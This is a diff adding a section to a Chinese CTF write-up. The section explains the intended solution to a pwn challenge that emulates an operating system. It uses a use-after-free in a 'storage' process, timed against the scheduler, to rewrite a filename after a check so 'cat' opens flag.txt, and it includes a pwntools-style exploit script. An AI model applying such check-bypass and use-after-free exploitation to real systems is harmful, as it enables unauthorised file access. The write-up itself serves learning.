@@ -235,6 +235,108 @@ ia()
 
 ![image-20210726112818057](https://i.loli.net/2021/07/26/fD7tkjhKxEZMYoO.png)
 
+### 补:第一问预期解
+
+看了下官方的直播, 发现第一问比我想的要复杂一点, 直接getshell其实是做简单了, 
+
+第一问, 因为使用cat会有检测, 但是cat输入的文件名存在堆块内, storage可以使用uaf修改堆内的数据, 
+
+而且os运行的时候是以此检查每个进程, 如果出现系统调用会依次处理, 于是在检测以后, open之前, 会运行一次storage中的指令, 如果我们可以控制好交互顺序, 就可以过了检测以后的一轮运行中, 先uaf修改文件名为flag.txt然后接着进入open的处理中, 这样绕过检测,
+
+初步的想法类似下面这样, 分别的系统调用和应该对应的样子,  
+
+```
+cat:
+	1.malloc
+	2.read
+	3.open
+	4.read
+	5.write
+
+storage:
+	1.read
+	2.wirte
+	3.read
+	4.write
+	5.read
+
+shell:
+	1.read
+	2.write
+	3.read
+	4.swap
+```
+
+
+
+![image-20210807184753396](https://i.loli.net/2021/08/07/dPqBY1GmjOHb3Jh.png)
+
+但是调试以后发现, 并不是所有进程系统调用暂停的时候运行一次, emmm, 也就是说上图的表格, 其实是不对齐的, 
+
+于是最后调试分析得到的图如下, 
+
+![image-20210807185333526](https://i.loli.net/2021/08/07/kahBtL62gxuMIVi.png)
+
+exp:
+
+```python
+
+def shell(con=''):
+    sla("shell(0)< ", con)
+
+def storage(con=''):
+    sla("storage(1)< ", con)
+
+def cat(con=''):
+    sla("cat(2)< ", con)
+
+def exp():
+    shell("SPAWN")
+    ru("shell(0)> Enter process name:")
+    shell("storage")
+    shell()
+    shell()
+    shell()
+    shell()
+    shell()
+    shell()
+
+    storage('1')
+    shell()
+    shell()
+    storage('0')
+    shell()
+    shell()
+    storage(str(0x100))
+    shell()
+    shell()
+
+    storage('2')
+    shell()
+    shell()
+    storage('0')
+    shell()
+    shell()
+    storage()
+
+    shell("SPAWN")
+    storage()
+    storage('3')
+    shell("cat")
+    storage('0')
+    shell()
+    shell()
+    shell()
+    cat('arst')
+    shell()
+    storage('flag.txt')
+
+```
+
+
+
+![image-20210807185418582](https://i.loli.net/2021/08/07/PmQhrVt4TiEaGNI.png)
+
 ## little buggy editor 
 
 文本编辑器, 这个题目一开始逆完了以后一直没找到啥漏洞点, 可以任意打开文件读取, 但是不能数据`/`和`..`, 思路大体是通过溢出`global_buffer`去修改后面的`filename`, 但是一直没想到漏洞怎么溢出, 
